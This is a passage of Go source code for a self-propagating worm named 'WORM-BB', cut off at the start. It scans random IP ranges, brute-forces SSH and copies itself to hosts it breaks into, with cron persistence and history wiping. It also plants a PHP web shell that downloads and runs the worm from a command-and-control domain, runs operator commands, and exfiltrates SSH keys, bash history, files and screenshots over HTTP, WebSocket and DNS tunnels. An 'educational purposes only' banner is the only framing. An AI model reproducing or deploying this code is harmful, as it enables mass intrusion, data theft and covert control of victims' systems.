				fmt.Printf("[+] Found open port %d on %s\n", port, target)
				p.attemptExploit(target, port)
				break
			}
		}
	}
}

func (p *Propagator) isPortOpen(host string, port int) bool {
	conn, err := net.DialTimeout("tcp", fmt.Sprintf("%s:%d", host, port), SCAN_TIMEOUT)
	if err != nil {
		return false
	}
	conn.Close()
	return true
}

func (p *Propagator) attemptExploit(target string, port int) {
	switch port {
	case 22:
		p.exploitSSH(target)
	case 445:
		p.exploitSMB(target)
	case 80, 443:
		p.exploitWeb(target)
	default:
		fmt.Printf("[*] No exploit for port %d on %s\n", port, target)
	}
}

func (p *Propagator) exploitSSH(target string) {
	for _, cred := range p.sshCreds {
		config := &ssh.ClientConfig{
			User: cred.User,
			Auth: []ssh.AuthMethod{
				ssh.Password(cred.Password),
			},
			HostKeyCallback: ssh.InsecureIgnoreHostKey(),
			Timeout:         5 * time.Second,
		}
		client, err := ssh.Dial("tcp", fmt.Sprintf("%s:22", target), config)
		if err != nil {
			continue
		}
		fmt.Printf("[!] SUCCESS: SSH %s@%s:%s\n", cred.User, target, cred.Password)
		p.deployPayloadSSH(client, target)
		client.Close()

		p.mu.Lock()
		p.infected[target] = true
		p.mu.Unlock()
		break
	}
}

func (p *Propagator) deployPayloadSSH(client *ssh.Client, target string) {
	session, err := client.NewSession()
	if err != nil {
		return
	}
	defer session.Close()

	exe, _ := os.Executable()
	exeData, _ := ioutil.ReadFile(exe)
	exeBase64 := base64.StdEncoding.EncodeToString(exeData)

	commands := []string{
		fmt.Sprintf("echo '%s' | base64 -d > /tmp/system-update", exeBase64),
		"chmod +x /tmp/system-update",
		"/tmp/system-update &",
		"(crontab -l 2>/dev/null; echo '@reboot /tmp/system-update') | crontab -",
		"history -c",
	}
	for _, cmd := range commands {
		session.Run(cmd)
	}
	fmt.Printf("[+] Deployed payload to %s\n", target)
}

func (p *Propagator) exploitSMB(target string) {
	conn, err := net.DialTimeout("tcp", fmt.Sprintf("%s:445", target), SCAN_TIMEOUT)
	if err != nil {
		return
	}
	defer conn.Close()
	conn.Write([]byte{0x00, 0x00, 0x00, 0x85, 0xFF, 0x53, 0x4D, 0x42})
	response := make([]byte, 1024)
	conn.SetReadDeadline(time.Now().Add(2 * time.Second))
	n, _ := conn.Read(response)
	if n > 0 && bytes.Contains(response[:n], []byte("SMB")) {
		fmt.Printf("[+] SMB service detected on %s\n", target)
		p.deployPayloadSMB(target)
	}
}

func (p *Propagator) deployPayloadSMB(target string) {
	fmt.Printf("[*] Would deploy SMB payload to %s\n", target)
}

func (p *Propagator) exploitWeb(target string) {
	urls := []string{
		fmt.Sprintf("http://%s/xmlrpc.php", target),
		fmt.Sprintf("http://%s/wp-admin/admin-ajax.php", target),
		fmt.Sprintf("http://%s/cgi-bin/php", target),
	}
	client := &http.Client{Timeout: 5 * time.Second}
	for _, url := range urls {
		resp, err := client.Get(url)
		if err == nil && resp.StatusCode == 200 {
			fmt.Printf("[+] Web service detected at %s\n", url)
			p.deployWebShell(target)
			break
		}
		if resp != nil {
			resp.Body.Close()
		}
	}
}

func (p *Propagator) deployWebShell(target string) {
	webshell := `<?php system($_GET['cmd']); ?>`
	client := &http.Client{Timeout: 5 * time.Second}
	req, _ := http.NewRequest("PUT", fmt.Sprintf("http://%s/shell.php", target), strings.NewReader(webshell))
	req.Header.Set("Content-Type", "application/x-httpd-php")
	resp, err := client.Do(req)
	if err == nil && resp.StatusCode == 200 {
		fmt.Printf("[+] Web shell deployed to %s/shell.php\n", target)
		wormURL := "http://" + C2_DNS_DOMAIN + "/worm"
		cmd := fmt.Sprintf("wget %s -O /tmp/worm && chmod +x /tmp/worm && /tmp/worm", wormURL)
		client.Get(fmt.Sprintf("http://%s/shell.php?cmd=%s", target, url.QueryEscape(cmd)))
	}
	if resp != nil {
		resp.Body.Close()
	}
}

func (p *Propagator) targetedPropagation() {
	p.population.mu.RLock()
	var sparseSegments []string
	for cidr, count := range p.population.networkSegments {
		if count < 3 {
			sparseSegments = append(sparseSegments, cidr)
		}
	}
	p.population.mu.RUnlock()
	for _, cidr := range sparseSegments {
		p.scanCIDR(cidr)
	}
}

func (p *Propagator) coordinatedScan() {
	fmt.Println("[*] Waiting for coordinated scan tasks")
	time.Sleep(10 * time.Second)
	p.scanLocalNetwork()
}

func (p *Propagator) expandToNewNetworks() {
	for i := 0; i < 10; i++ {
		a := randInt(1, 255)
		b := randInt(0, 255)
		c := randInt(0, 255)
		cidr := fmt.Sprintf("%d.%d.%d.0/24", a, b, c)
		p.population.mu.RLock()
		_, exists := p.population.networkSegments[cidr]
		p.population.mu.RUnlock()
		if !exists {
			go p.scanCIDR(cidr)
		}
	}
}

func (p *Propagator) stealthPropagation() {
	ticker := time.NewTicker(5 * time.Minute)
	for range ticker.C {
		p.scanSingleHost()
		time.Sleep(time.Duration(randInt(30, 300)) * time.Second)
	}
}

func (p *Propagator) scanSingleHost() {
	ip := fmt.Sprintf("%d.%d.%d.%d", randInt(1, 255), randInt(0, 255), randInt(0, 255), randInt(1, 254))
	if p.isPortOpen(ip, 22) {
		p.exploitSSH(ip)
	}
}

func (p *Propagator) sshPropagation() {}
func (p *Propagator) smbPropagation() {}
func (p *Propagator) webPropagation() {}

// ========== C2 MANAGER ==========

type C2Manager struct {
	websocketConn *websocket.Conn
	dnsTunnel     *DNSTunnel
	httpClient    *http.Client
	commands      chan C2Command
	results       chan interface{}
	mu            sync.Mutex
	connected     bool
	reconnectChan chan bool
}

type DNSTunnel struct {
	domain    string
	aesKey    []byte
	seqNum    uint32
	queue     chan []byte
	responses chan []byte
}

func NewC2Manager() *C2Manager {
	return &C2Manager{
		commands:      make(chan C2Command, 100),
		results:       make(chan interface{}, 100),
		reconnectChan: make(chan bool),
		httpClient: &http.Client{
			Timeout: 30 * time.Second,
			Transport: &http.Transport{
				TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
			},
		},
	}
}

func (c2 *C2Manager) Start() {
	go c2.connectWebSocket()
	go c2.connectDNSTunnel()
	go c2.connectHTTPBeacon()
	go c2.processCommands()
	go c2.heartbeatLoop()
	go c2.exfilLoop()
}

func (c2 *C2Manager) connectWebSocket() {
	dialer := websocket.Dialer{
		TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
	}
	for {
		conn, _, err := dialer.Dial(C2_WEBSOCKET, nil)
		if err == nil {
			c2.mu.Lock()
			c2.websocketConn = conn
			c2.connected = true
			c2.mu.Unlock()
			c2.listenWebSocket(conn)
		}
		time.Sleep(30 * time.Second)
	}
}

func (c2 *C2Manager) listenWebSocket(conn *websocket.Conn) {
	for {
		var msg map[string]interface{}
		err := conn.ReadJSON(&msg)
		if err != nil {
			c2.mu.Lock()
			c2.connected = false
			c2.mu.Unlock()
			return
		}
		if cmdType, ok := msg["type"].(string); ok {
			cmd := C2Command{
				ID:        generateID(),
				Type:      cmdType,
				Timestamp: time.Now(),
			}
			if target, ok := msg["target"].(string); ok {
				cmd.Target = target
			}
			if params, ok := msg["parameters"].(map[string]interface{}); ok {
				cmd.Parameters = params
			}
			c2.commands <- cmd
		}
	}
}

func (c2 *C2Manager) connectDNSTunnel() {
	hash := sha256.Sum256([]byte(wormID))
	tunnel := &DNSTunnel{
		domain:    C2_DNS_DOMAIN,
		aesKey:    hash[:],
		queue:     make(chan []byte, 100),
		responses: make(chan []byte, 100),
	}
	c2.dnsTunnel = tunnel
	go tunnel.sendLoop()
	go tunnel.recvLoop()
}

func (dt *DNSTunnel) sendLoop() {
	for data := range dt.queue {
		encrypted := dt.encrypt(data)
		encoded := base32.StdEncoding.EncodeToString(encrypted)
		for i := 0; i < len(encoded); i += 63 {
			end := i + 63
			if end > len(encoded) {
				end = len(encoded)
			}
			chunk := encoded[i:end]
			query := fmt.Sprintf("%s.%x.%s", chunk, dt.seqNum, dt.domain)
			dt.seqNum++
			c := new(dns.Client)
			m := new(dns.Msg)
			m.SetQuestion(query, dns.TypeA)
			c.Exchange(m, "8.8.8.8:53")
		}
	}
}

func (dt *DNSTunnel) recvLoop() {
	dns.HandleFunc(dt.domain, func(w dns.ResponseWriter, r *dns.Msg) {
		for _, q := range r.Question {
			if q.Qtype == dns.TypeTXT {
				// Extract command – placeholder
			}
		}
	})
	s := &dns.Server{Addr: ":53", Net: "udp"}
	s.ListenAndServe()
}

func (dt *DNSTunnel) encrypt(data []byte) []byte {
	block, _ := aes.NewCipher(dt.aesKey)
	gcm, _ := cipher.NewGCM(block)
	nonce := make([]byte, gcm.NonceSize())
	rand.Read(nonce)
	return gcm.Seal(nonce, nonce, data, nil)
}

func (c2 *C2Manager) connectHTTPBeacon() {
	ticker := time.NewTicker(1 * time.Minute)
	for range ticker.C {
		req, _ := http.NewRequest("GET", fmt.Sprintf("https://%s/beacon", C2_DNS_DOMAIN), nil)
		req.Header.Set("User-Agent", c2.randomUserAgent())
		req.Header.Set("X-Request-ID", generateID())
		resp, err := c2.httpClient.Do(req)
		if err == nil {
			defer resp.Body.Close()
			var cmd C2Command
			if json.NewDecoder(resp.Body).Decode(&cmd) == nil {
				c2.commands <- cmd
			}
		}
		time.Sleep(time.Duration(randInt(30, 90)) * time.Second)
	}
}

func (c2 *C2Manager) randomUserAgent() string {
	agents := []string{
		"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
		"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36",
		"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36",
	}
	return agents[randInt(0, len(agents))]
}

func (c2 *C2Manager) processCommands() {
	for cmd := range c2.commands {
		fmt.Printf("[C2] Received command: %s (type: %s)\n", cmd.ID, cmd.Type)
		switch cmd.Type {
		case "SCAN":
			go c2.executeScan(cmd)
		case "EXFIL":
			go c2.executeExfil(cmd)
		case "PROPAGATE":
			go c2.executePropagate(cmd)
		case "EXECUTE":
			go c2.executeCommand(cmd)
		case "UPDATE":
			go c2.updateWorm(cmd)
		case "SLEEP":
			go c2.sleepWorm(cmd)
		}
	}
}

func (c2 *C2Manager) executeScan(cmd C2Command) {
	target := cmd.Target
	if target == "" {
		target = "local"
	}
	results := map[string]interface{}{
		"target":        target,
		"open_ports":    []int{},
		"vulnerabilities": []string{},
	}
	c2.results <- results
}

func (c2 *C2Manager) executeExfil(cmd C2Command) {
	dataType := cmd.Parameters["type"].(string)
	switch dataType {
	case "credentials":
		c2.exfilCredentials()
	case "files":
		path := cmd.Parameters["path"].(string)
		c2.exfilFiles(path)
	case "screenshot":
		c2.takeScreenshot()
	case "keylogs":
		c2.exfilKeylogs()
	}
}

func (c2 *C2Manager) exfilCredentials() {
	creds := make(map[string]string)
	if runtime.GOOS == "windows" {
		output, _ := exec.Command("cmd", "/c", "dir /s /b *password*").Output()
		creds["windows_search"] = string(output)
	} else {
		sshKeys, _ := filepath.Glob(os.Getenv("HOME") + "/.ssh/*")
		for _, key := range sshKeys {
			data, _ := ioutil.ReadFile(key)
			creds[key] = base64.StdEncoding.EncodeToString(data)
		}
		history, _ := ioutil.ReadFile(os.Getenv("HOME") + "/.bash_history")
		creds["bash_history"] = string(history)
	}
	dataBuffer <- ExfilData{
		WormID:    wormID,
		Timestamp: time.Now(),
		DataType:  "CREDENTIALS",
		Data:      creds,
		Encrypted: true,
	}
}

func (c2 *C2Manager) exfilFiles(path string) {
	files, _ := ioutil.ReadDir(path)
	for _, file := range files {
		if !file.IsDir() && file.Size() < 10*1024*1024 {
			data, _ := ioutil.ReadFile(filepath.Join(path, file.Name()))
			dataBuffer <- ExfilData{
				WormID:    wormID,
				Timestamp: time.Now(),
				DataType:  "FILE",
				Target:    filepath.Join(path, file.Name()),
				Data:      base64.StdEncoding.EncodeToString(data),
				Encrypted: true,
			}
		}
	}
}

func (c2 *C2Manager) takeScreenshot() {
	if runtime.GOOS == "windows" {
		script := `
Add-Type -AssemblyName System.Windows.Forms
Add-Type -AssemblyName System.Drawing
$screen = [System.Windows.Forms.SystemInformation]::VirtualScreen
$bitmap = New-Object System.Drawing.Bitmap $screen.Width, $screen.Height
$graphics = [System.Drawing.Graphics]::FromImage($bitmap)
$graphics.CopyFromScreen($screen.X, $screen.Y, 0, 0, $bitmap.Size)
$bitmap.Save('C:\Windows\Temp\screenshot.png')
$base64 = [Convert]::ToBase64String([IO.File]::ReadAllBytes('C:\Windows\Temp\screenshot.png'))
Write-Output $base64
Remove-Item 'C:\Windows\Temp\screenshot.png'
`
		output, _ := exec.Command("powershell", "-Command", script).Output()
		dataBuffer <- ExfilData{
			WormID:    wormID,
			Timestamp: time.Now(),
			DataType:  "SCREENSHOT",
			Data:      string(output),
			Encrypted: true,
		}
	}
}

func (c2 *C2Manager) exfilKeylogs() {}

func (c2 *C2Manager) executePropagate(cmd C2Command) {
	method := cmd.Parameters["method"].(string)
	switch method {
	case "ssh":
	case "smb":
	case "webshell":
	case "usb":
	}
}

func (c2 *C2Manager) executeCommand(cmd C2Command) {
	command := cmd.Parameters["command"].(string)
	output, _ := exec.Command(command).Output()
	dataBuffer <- ExfilData{
		WormID:    wormID,
		Timestamp: time.Now(),
		DataType:  "COMMAND_OUTPUT",
		Data:      string(output),
		Encrypted: true,
	}
}

func (c2 *C2Manager) updateWorm(cmd C2Command) {
	updateURL := cmd.Parameters["url"].(string)
	resp, err := c2.httpClient.Get(updateURL)
	if err != nil {
		return
	}
	defer resp.Body.Close()
	newWorm, _ := ioutil.ReadAll(resp.Body)
	exe, _ := os.Executable()
	ioutil.WriteFile(exe+".bak", newWorm, 0755)
	os.Rename(exe+".bak", exe)
	exec.Command(exe).Start()
	os.Exit(0)
}

func (c2 *C2Manager) sleepWorm(cmd C2Command) {
	duration := cmd.Parameters["duration"].(int)
	time.Sleep(time.Duration(duration) * time.Second)
}

func (c2 *C2Manager) heartbeatLoop() {
	ticker := time.NewTicker(5 * time.Minute)
	for range ticker.C {
		heartbeat := map[string]interface{}{
			"worm_id":    wormID,
			"timestamp":  time.Now(),
			"status":     "ACTIVE",
			"population": len(wormPopulation.knownInstances),
			"os":         runtime.GOOS,
			"arch":       runtime.GOARCH,
			"version":    VERSION,
		}
		c2.sendToC2("HEARTBEAT", heartbeat)
	}
}

func (c2 *C2Manager) exfilLoop() {
	for data := range dataBuffer {
		c2.sendToC2("EXFIL", data)
	}
}

func (c2 *C2Manager) sendToC2(msgType string, payload interface{}) {
	msg := map[string]interface{}{
		"type":    msgType,
		"worm_id": wormID,
		"payload": payload,
	}
	c2.mu.Lock()
	defer c2.mu.Unlock()
	if c2.websocketConn != nil && c2.connected {
		c2.websocketConn.WriteJSON(msg)
	}
	if c2.dnsTunnel != nil {
		data, _ := json.Marshal(msg)
		c2.dnsTunnel.queue <- data
	}
}

// ========== DATA EXFILTRATION ==========

type DataExfiltrator struct {
	dbConn     *sql.DB
	buffer     []ExfilData
	mu         sync.Mutex
	batchSize  int
	httpClient *http.Client
}

func NewDataExfiltrator() *DataExfiltrator {
	return &DataExfiltrator{
		buffer:    make([]ExfilData, 0),
		batchSize: 100,
		httpClient: &http.Client{
			Timeout: 30 * time.Second,
			Transport: &http.Transport{
				TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
			},
		},
	}
}

func (de *DataExfiltrator) Start() {
	go de.connectToDatabase()
	go de.httpExfilLoop()
	go de.processBuffer()
}

func (de *DataExfiltrator) connectToDatabase() {
	dsn := fmt.Sprintf("%s:%s@tcp(%s:%d)/%s?charset=utf8mb4",
		"worm_user", "worm_password", "db.example.com", 3306, "worm_data")
	for {
		db, err := sql.Open("mysql", dsn)
		if err == nil {
			de.dbConn = db
			de.dbConn.SetMaxOpenConns(10)
			de.createTables()
			break
		}
		time.Sleep(1 * time.Minute)
	}
}

func (de *DataExfiltrator) createTables() {
	queries := []string{
		`CREATE TABLE IF NOT EXISTS exfil_data (
            id BIGINT AUTO_INCREMENT PRIMARY KEY,
            worm_id VARCHAR(64) NOT NULL,
            timestamp DATETIME NOT NULL,
            data_type VARCHAR(50) NOT NULL,
            target VARCHAR(255),
            data LONGTEXT,
            encrypted BOOLEAN DEFAULT TRUE,
            processed BOOLEAN DEFAULT FALSE,
            INDEX idx_worm_id (worm_id),
            INDEX idx_timestamp (timestamp)
        ) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4`,
		`CREATE TABLE IF NOT EXISTS worm_instances (
            worm_id VARCHAR(64) PRIMARY KEY,
            ip_address VARCHAR(45),
            hostname VARCHAR(255),
            os VARCHAR(50),
            arch VARCHAR(20),
            first_seen DATETIME,
            last_seen DATETIME,
            status VARCHAR(20),
            capabilities JSON
        ) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4`,
		`CREATE TABLE IF NOT EXISTS compromised_targets (
            id BIGINT AUTO_INCREMENT PRIMARY KEY,
            target_ip VARCHAR(45),
            target_hostname VARCHAR(255),
            worm_id VARCHAR(64),
            compromise_time DATETIME,
            method VARCHAR(50),
            credentials JSON,
            UNIQUE KEY uk_target (target_ip)
        ) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4`,
	}
	for _, query := range queries {
		de.dbConn.Exec(query)
	}
}

func (de *DataExfiltrator) httpExfilLoop() {
	ticker := time.NewTicker(1 * time.Minute)
	for range ticker.C {
		de.mu.Lock()
		if len(de.buffer) == 0 {
			de.mu.Unlock()
			continue
		}
		batch := make([]ExfilData, len(de.buffer))
		copy(batch, de.buffer)
		de.buffer = make([]ExfilData, 0)
		de.mu.Unlock()

		data, _ := json.Marshal(batch)
		encrypted := de.encryptData(data)
		resp, err := de.httpClient.Post(DATA_EXFIL_SERVER, "application/octet-stream", bytes.NewReader(encrypted))
		if err == nil && resp.StatusCode == 200 {
			fmt.Printf("[Exfil] Successfully exfiltrated %d records\n", len(batch))
		} else {
			de.mu.Lock()
			de.buffer = append(batch, de.buffer...)
			de.mu.Unlock()
		}
		if resp != nil {
			resp.Body.Close()
		}
	}
}

func (de *DataExfiltrator) encryptData(data []byte) []byte {
	key := sha256.Sum256([]byte(wormID))
	block, _ := aes.NewCipher(key[:])
	gcm, _ := cipher.NewGCM(block)
	nonce := make([]byte, gcm.NonceSize())
	rand.Read(nonce)
	return gcm.Seal(nonce, nonce, data, nil)
}

func (de *DataExfiltrator) AddData(data ExfilData) {
	de.mu.Lock()
	defer de.mu.Unlock()
	de.buffer = append(de.buffer, data)
	if de.dbConn != nil {
		_, err := de.dbConn.Exec(
			"INSERT INTO exfil_data (worm_id, timestamp, data_type, target, data, encrypted) VALUES (?, ?, ?, ?, ?, ?)",
			data.WormID, data.Timestamp, data.DataType, data.Target, data.Data, data.Encrypted)
		if err == nil {
			de.buffer = de.buffer[:len(de.buffer)-1]
		}
	}
	if len(de.buffer) >= de.batchSize {
		go de.processBuffer()
	}
}

func (de *DataExfiltrator) processBuffer() {
	de.mu.Lock()
	if len(de.buffer) == 0 {
		de.mu.Unlock()
		return
	}
	batch := make([]ExfilData, len(de.buffer))
	copy(batch, de.buffer)
	de.buffer = make([]ExfilData, 0)
	de.mu.Unlock()

	if de.dbConn != nil {
		tx, err := de.dbConn.Begin()
		if err == nil {
			stmt, _ := tx.Prepare("INSERT INTO exfil_data (worm_id, timestamp, data_type, target, data, encrypted) VALUES (?, ?, ?, ?, ?, ?)")
			for _, data := range batch {
				stmt.Exec(data.WormID, data.Timestamp, data.DataType, data.Target, data.Data, data.Encrypted)
			}
			tx.Commit()
			fmt.Printf("[Exfil] Inserted %d records to database\n", len(batch))
			return
		}
	}
	data, _ := json.Marshal(batch)
	encrypted := de.encryptData(data)
	de.httpClient.Post(DATA_EXFIL_SERVER, "application/octet-stream", bytes.NewReader(encrypted))
}

// ========== MAIN WORM ==========

type Worm struct {
	id              string
	population      *WormPopulation
	propagator      *Propagator
	persistence     *PersistenceManager
	usbPropagator   *USBPropagator
	webShellManager *WebShellManager
	wifiPropagator  *WiFiPropagator
	c2Manager       *C2Manager
	dataExfiltrator *DataExfiltrator
	status          string
	mu              sync.Mutex
}

func NewWorm() *Worm {
	wormID = generateID()
	dataBuffer = make(chan ExfilData, 1000)

	w := &Worm{
		id:     wormID,
		status: "INITIALIZING",
	}
	w.population = NewWormPopulation()
	w.propagator = NewPropagator(w.population)
	w.persistence = NewPersistenceManager()
	w.usbPropagator = NewUSBPropagator()
	w.webShellManager = NewWebShellManager()
	w.wifiPropagator = NewWiFiPropagator()
	w.c2Manager = NewC2Manager()
	w.dataExfiltrator = NewDataExfiltrator()

	return w
}

func (w *Worm) Run() {
	fmt.Printf("[Worm-BB] Instance %s starting on %s/%s (Version %s)\n", w.id, runtime.GOOS, runtime.GOARCH, VERSION)

	w.population.CoordinateWithPeers()
	w.persistence.InstallAll()
	go w.propagator.Start()
	go w.usbPropagator.StartMonitoring()
	go w.wifiPropagator.Start()
	go w.c2Manager.Start()
	go w.dataExfiltrator.Start()

	w.maintenanceLoop()
}

func (w *Worm) maintenanceLoop() {
	ticker := time.NewTicker(30 * time.Second)
	for range ticker.C {
		w.status = "ACTIVE"
		w.c2Manager.sendToC2("STATUS", map[string]interface{}{
			"population":   len(w.population.knownInstances),
			"role":         w.population.leader,
			"usb_infected": len(w.usbPropagator.infectedUSBs),
			"webshells":    len(w.webShellManager.deployed),
			"os":           runtime.GOOS,
			"arch":         runtime.GOARCH,
			"version":      VERSION,
		})
	}
}

// ========== UTILITY FUNCTIONS ==========

func generateID() string {
	hostname, _ := os.Hostname()
	interfaces, _ := net.Interfaces()
	mac := ""
	if len(interfaces) > 0 {
		mac = interfaces[0].HardwareAddr.String()
	}
	data := fmt.Sprintf("%s-%s-%d-%s-%s", hostname, mac, time.Now().UnixNano(), runtime.GOOS, runtime.GOARCH)
	hash := sha256.Sum256([]byte(data))
	return hex.EncodeToString(hash[:16])
}

func getLocalIP() string {
	addrs, err := net.InterfaceAddrs()
	if err != nil {
		return "127.0.0.1"
	}
	for _, addr := range addrs {
		if ipnet, ok := addr.(*net.IPNet); ok && !ipnet.IP.IsLoopback() && ipnet.IP.To4() != nil {
			return ipnet.IP.String()
		}
	}
	return "127.0.0.1"
}

func getHostname() string {
	h, _ := os.Hostname()
	return h
}

func randInt(min, max int) int {
	b := make([]byte, 4)
	rand.Read(b)
	return min + int(binary.BigEndian.Uint32(b))%(max-min)
}

func inc(ip net.IP) {
	for j := len(ip) - 1; j >= 0; j-- {
		ip[j]++
		if ip[j] > 0 {
			break
		}
	}
}

func generateCIDRs() []string {
	cidrs := make([]string, 0)
	for i := 1; i <= 10; i++ {
		cidrs = append(cidrs, fmt.Sprintf("192.168.%d.0/24", i))
	}
	for i := 0; i < 5; i++ {
		cidrs = append(cidrs, fmt.Sprintf("10.0.%d.0/24", i))
	}
	return cidrs
}

type Task struct {
	ID       string
	Type     string
	Target   string
	Priority int
	Status   string
}

type WormMessage struct {
	Type      string
	SenderID  string
	Timestamp time.Time
	Payload   interface{}
}

var wormPopulation *WormPopulation

func init() {
	wormPopulation = NewWormPopulation()
}

// ========== ENTRY POINT ==========

func main() {
	fmt.Println(strings.Repeat("=", 80))
	fmt.Println("WORM-BB Advanced Propagation Framework")
	fmt.Printf("Version: %s | OS: %s | Arch: %s\n", VERSION, runtime.GOOS, runtime.GOARCH)
	fmt.Println("EDUCATIONAL PURPOSES ONLY - Understand to Defend")
	fmt.Println(strings.Repeat("=", 80))

	worm := NewWorm()
	worm.Run()

	select {}
}
